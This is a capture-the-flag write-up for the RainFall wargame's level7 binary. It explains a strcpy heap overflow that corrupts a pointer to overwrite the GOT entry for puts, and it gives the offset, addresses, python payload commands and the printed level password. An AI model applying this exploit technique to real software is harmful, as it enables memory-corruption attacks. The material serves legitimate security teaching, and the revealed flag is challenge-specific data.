# Level7 — Heap Overflow + GOT Overwrite

## Context

The binary builds two structs on the heap, each holding an integer tag and a pointer to a small data buffer. It then copies `argv[1]` and `argv[2]` into those buffers using `strcpy()` — with no bounds check. By overflowing the first buffer we corrupt the destination pointer of the second `strcpy`, giving us an **arbitrary write primitive**. We use it to overwrite `GOT[puts]` with the address of `m()`, a hidden function that prints the password.

---

## How the heap is laid out

Four consecutive `malloc(8)` calls produce a perfectly predictable layout:

```
address     content
─────────────────────────────────────────────────────
0x0804a008  [ s1.tag = 1      ][ s1.data → 0x0804a018 ]   ← struct s1  (8 bytes)
0x0804a018  [ ........ s1 data buffer (8 bytes) ........ ]  ← s1->data
0x0804a028  [ s2.tag = 2      ][ s2.data → 0x0804a038 ]   ← struct s2  (8 bytes)
0x0804a038  [ ........ s2 data buffer (8 bytes) ........ ]  ← s2->data
```

The two vulnerable copies:

```c
strcpy(s1->data, argv[1]);   // writes to 0x0804a018 — no size check
strcpy(s2->data, argv[2]);   // writes to wherever s2->data points
```

If `argv[1]` overflows `s1->data`, it keeps writing into `s2` and overwrites `s2->data` — the destination pointer of the second `strcpy`.

---

## Finding the offset

`s2->data` is stored at `s2 + 4 = 0x0804a028 + 4 = 0x0804a02c`.

Distance from the start of `s1->data` (`0x0804a018`) to `s2->data` (`0x0804a02c`):

```
0x0804a02c − 0x0804a018 = 0x14 = 20 bytes
```

We generate a cyclic pattern with [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and pass it as `argv[1]`:

```bash
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab... aaaa
# strcpy(0x0804a018, "Aa0Aa1...")  ← ok
# strcpy(0x37614136, "aaaa")       ← SIGSEGV: destination corrupted
```

`0x37614136` = `"6Aa7"` in little-endian → wiremask returns **offset 20**.

The 20th byte of the overflow reaches `s2->data`. Everything before byte 20 is padding; the 4 bytes at position 20–23 become the new destination for the second `strcpy`.

---

## Target addresses

**`puts@got` — the entry we overwrite:**

```asm
(gdb) disass puts
0x08048400 <+0>:  jmp *0x8049928    ← GOT slot for puts
```

→ `GOT[puts] = 0x08049928`

**`m()` — the hidden function we redirect execution to:**

```asm
(gdb) disass m
0x080484f4   printf(g_password, time(0))   ← prints /home/user/level8/.pass
```

→ `&m = 0x080484f4`

---

## Payload

```
argv[1]:  [ 'A' × 20 padding ][ 0x08049928 ]   →  corrupts s2->data to point at GOT[puts]
argv[2]:  [ 0x080484f4       ]                  →  written into GOT[puts]
```

When `main` calls `puts("~~")` it reads the GOT slot → jumps to `m()` → prints the password.

```bash
python -c "print('A' * 20 + '\x28\x99\x04\x08')" > /tmp/exploit7   # argv[1]
python -c "print('\xf4\x84\x04\x08')"             > /tmp/exploit72  # argv[2]

./level7 `cat /tmp/exploit7` `cat /tmp/exploit72`
```

---

## Full execution flow

```
1. malloc × 4  →  s1 / s1.data / s2 / s2.data on heap, consecutive
2. strcpy(s1->data, argv[1])
      ├── bytes  0–19 : fill s1.data + s2.tag   (padding)
      └── bytes 20–23 : overwrite s2->data  →  0x08049928 (GOT[puts])
3. strcpy(GOT[puts], argv[2])
      └── writes 0x080484f4 (&m) into GOT[puts]
4. puts("~~")  →  jmp *GOT[puts]  →  jumps to m()
5. m()  →  printf(g_password)  →  prints /home/user/level8/.pass
```

---

## Result

```bash
level7@RainFall:~$ ./level7 `cat /tmp/exploit7` `cat /tmp/exploit72`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1778683650
```
